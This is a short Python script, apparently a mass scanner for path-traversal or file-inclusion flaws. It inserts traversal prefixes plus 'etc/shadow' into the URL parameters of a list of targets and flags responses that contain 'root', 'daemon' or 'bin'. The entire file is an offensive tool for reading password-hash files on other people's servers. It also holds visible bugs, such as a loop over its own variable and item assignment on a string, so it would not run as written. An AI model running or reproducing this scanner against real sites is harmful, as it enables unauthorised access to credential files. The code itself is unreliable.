import re
import requests
import time

def main():

    # Inputs
    # -----------------------------------------------

    f = open("prefixes", "r") # filename of Prefix
    prefixes = re.split("\n", str(f.read()))
    f.close()

    f = open("urls", "r") # filename of targets
    targets = re.split("\n", str(f.read()))
    f.close()

    suffixes = ["etc/shadow"] # suffix
    
    delay = 1 # time of delay between every request

    # -----------------------------------------------

    # for every url
    for target in targets:
        # for every prefix
        for prefix in prefixes:
            # for every suffix
            for suffix in suffix:

                payload = prefix + suffix # declare payload
                
                search = re.search("=", target) # True if "=" else False
                num = re.findall("=", target) # number of "=" in target
                
                if search: # if "="
                    url = target # copy var
                    url[search.start(), search.end()] = "=" + payload # replace "=" with "=" + payload
                    try:
                        res = requests.get(url) # request
                        time.sleep(delay) # delay
                        # if content in ["daemon" or "root" or "bin"]
                        if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
                            print(url) # vuln                
                    except: pass

                    for n in num: # for number of "=" in target
                        search = re.search("=", target[search.end():]) # search for "=" in range (number of "=" in target)
                        if search: # if "="
                            url = target # copy var
                            url[search.start(), search.end()] = "=" + payload # replace "=" with "=" + payload
                            try:
                                res = requests.get(url) # request
                                time.sleep(delay) # delay
                                # if content in ["daemon" or "root" or "bin"]
                                if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
                                    print(url) # vuln                
                            except: pass

main()